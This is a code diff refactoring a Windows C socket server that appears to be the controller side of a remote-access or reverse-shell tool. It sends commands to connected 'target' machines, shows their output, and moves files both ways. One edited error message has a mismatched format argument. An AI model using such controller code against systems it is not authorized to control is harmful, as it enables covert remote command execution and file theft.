@@ -49,15 +49,14 @@ const SOCKET create_socket() {
 	// Create the server socket object.
 	const SOCKET listen_socket = socket(AF_INET, SOCK_STREAM, 0);
 	if (listen_socket == INVALID_SOCKET) {
-		printf("Socket creation failed with error: %ld\n", WSAGetLastError());
+		fprintf(stderr, "Socket creation failed: %ld\n", WSAGetLastError());
 		WSACleanup();
 		exit(1);
 	}
 
 	int optval = 1;
-	if (setsockopt(listen_socket, SOL_SOCKET, SO_REUSEADDR, (const char*)&optval, sizeof(optval)) < 0)
-	{
-		printf("Error setting socket options.\n");
+	if (setsockopt(listen_socket, SOL_SOCKET, SO_REUSEADDR, (const char*)&optval, sizeof(optval)) < 0) {
+		fprintf(stderr, "Error setting socket options: \n", WSAGetLastError());
 		close_server(listen_socket);
 		exit(1);
 	}
@@ -76,13 +75,16 @@ void bind_socket(const SOCKET listen_socket, const int port) {
 
 	// Bind ip address and port to listen_socket.
 	if (bind(listen_socket, (struct sockaddr*)&hint, sizeof(hint)) == SOCKET_ERROR) {
-		printf("Socket bind failed with error: %d\n", WSAGetLastError());
+		fprintf(stderr, "Socket bind failed with error: %d\n", WSAGetLastError());
 		close_server(listen_socket);
 		exit(1);
 	}
 
 	// Place the listen_socket in listen state.
-	listen(listen_socket, SOMAXCONN);
+	if (listen(listen_socket, SOMAXCONN) != 0) {
+		fprintf(stderr, "An error occured while placing the socket in listening stack: %d", WSAGetLastError());
+		exit(1);
+	}
 }
 
 // Thread to recursively accept connections.
@@ -103,8 +105,10 @@ DWORD WINAPI accept_conns(LPVOID* lp_param) {
 
 		// Client socket object.
 		const SOCKET client_socket = accept(conns->listen_socket, (struct sockaddr*)&client, &clientSize);
-		if (client_socket == INVALID_SOCKET)
-			printf("Error accepting client connection.");
+		if (client_socket == INVALID_SOCKET) {
+			perror("Error accepting client connection.");
+			continue;
+		}
 
 		// Client's remote name and client's ingress port.
 		char host[NI_MAXHOST] = { 0 };
@@ -172,15 +176,15 @@ int send_file(char* const buf, const size_t cmd_len, const SOCKET client_socket)
 	if (send(client_socket, (char*)&bytes, sizeof(bytes), 0) < 1)
 		return SOCKET_ERROR;
 
-	int iResult = 1;
+	int i_result = 1;
 
 	if (f_size) {
 		// Recursively read file until EOF is detected and send file bytes to client in BUFLEN chunks.
 		int bytes_read;
-		while (!feof(fd) && iResult > 0) {
+		while (!feof(fd) && i_result > 0) {
 			if (bytes_read = fread(buf, 1, BUFLEN, fd)) {
 				// Send file's bytes chunk to remote server.
-				iResult = send(client_socket, buf, bytes_read, 0);
+				i_result = send(client_socket, buf, bytes_read, 0);
 			}
 			else {
 				break;
@@ -190,7 +194,7 @@ int send_file(char* const buf, const size_t cmd_len, const SOCKET client_socket)
 		fclose(fd);
 	}
 
-	return iResult;
+	return i_result;
 }
 
 // Function to receive file from target machine (TCP file transfer).
@@ -207,21 +211,21 @@ int recv_file(char* const buf, const size_t cmd_len, const SOCKET client_socket)
 		return SOCKET_ERROR;
 
 	uint32_t f_size = ntohl_conv(&*(buf));
-	int iResult = 1;
+	int i_result = 1;
 
 	// Varaible to keep track of downloaded data.
 	long int total = 0;
 
 	// Receive all file bytes/chunks and write to file until total == file size.
-	while (total != f_size && iResult > 0) {
-		iResult = recv(client_socket, buf, BUFLEN, 0);
-		fwrite(buf, 1, iResult, fd);
-		total += iResult;
+	while (total != f_size && i_result > 0) {
+		i_result = recv(client_socket, buf, BUFLEN, 0);
+		fwrite(buf, 1, i_result, fd);
+		total += i_result;
 	}
 
 	fclose(fd);
 
-	return iResult;
+	return i_result;
 }
 
 // Function send change directory command to client.
@@ -252,17 +256,17 @@ int send_cmd(char* const buf, const size_t cmd_len, const SOCKET client_socket) 
 
 	uint32_t s_size = ntohl_conv(&*(buf));
 
-	int iResult = 1;
+	int i_result = 1;
 	// Receive command output stream and write output chunks to stdout.
 	do {
-		if ((iResult = recv(client_socket, buf, BUFLEN, 0)) < 1)
-			return iResult;
-		fwrite(buf, 1, iResult, stdout);
-	} while ((s_size -= iResult) > 0);
+		if ((i_result = recv(client_socket, buf, BUFLEN, 0)) < 1)
+			return i_result;
+		fwrite(buf, 1, i_result, stdout);
+	} while ((s_size -= i_result) > 0);
 
 	fputc('\n', stdout);
 
-	return iResult;
+	return i_result;
 }
 
 // Function to return function pointer based on parsed command.
@@ -277,7 +281,7 @@ const func parse_cmd(char* const buf) {
 			return func_array[i];
 		}
 	}
-	
+
 	return &send_cmd;
 }
 
@@ -298,10 +302,10 @@ void interact(Conn_map* conns, char* const buf, const int client_id) {
 	const SOCKET client_socket = conns->clients[client_id].sock;
 	char* client_host = conns->clients[client_id].host;
 
-	int iResult = 1;
+	int i_result = 1;
 
 	// Receive and parse input/send commands to client.
-	while (iResult > 0) {
+	while (i_result > 0) {
 		printf("%s // ", client_host);
 		// Set all bytes in buffer to zero.
 		memset(buf, '\0', BUFLEN);
@@ -317,7 +321,7 @@ void interact(Conn_map* conns, char* const buf, const int client_id) {
 				// If a command is parsed call it's corresponding function else execute-
 				// the command on the client.
 				const func target_func = parse_cmd(cmd);
-				iResult = target_func(buf, cmd_len, client_socket);
+				i_result = target_func(buf, cmd_len, client_socket);
 			}
 		}
 	}
@@ -336,7 +340,7 @@ void exec_cmd(char* const buf) {
 	size_t cmd_len = ftell(fpipe);
 	fseek(fpipe, 0, SEEK_SET);
 
-	// Store command output.
+	// Stream/write command output to stdout.
 	int rb = 0;
 	do {
 		rb = fread(buf, 1, BUFLEN, fpipe);
